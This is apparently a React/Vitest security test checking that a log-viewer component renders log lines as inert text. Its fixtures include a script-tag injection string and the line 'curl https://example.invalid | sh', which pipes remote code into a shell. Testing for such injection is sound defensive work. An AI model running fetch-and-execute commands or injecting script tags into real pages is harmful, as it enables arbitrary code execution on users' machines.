import React from "react";
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { VirtualLogViewport } from "../../packages/ui/src/log-pane/VirtualLogViewport";
import { assertRenderedAsInertText } from "./helpers/inert-rendering-assertions";

describe("log content inert security", () => {
  it("renders executable-looking log content only as inert text", () => {
    const rawLogText =
      '<script>window.crosslogCompromised = true</script><a href="https://example.invalid">open</a>\u001b[31m';
    const { container, getByText } = render(
      React.createElement(VirtualLogViewport, {
        title: "security.log",
        lines: [rawLogText, "curl https://example.invalid | sh"],
      }),
    );

    assertRenderedAsInertText(container, rawLogText);
    expect(getByText("curl https://example.invalid | sh")).toBeTruthy();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });
});
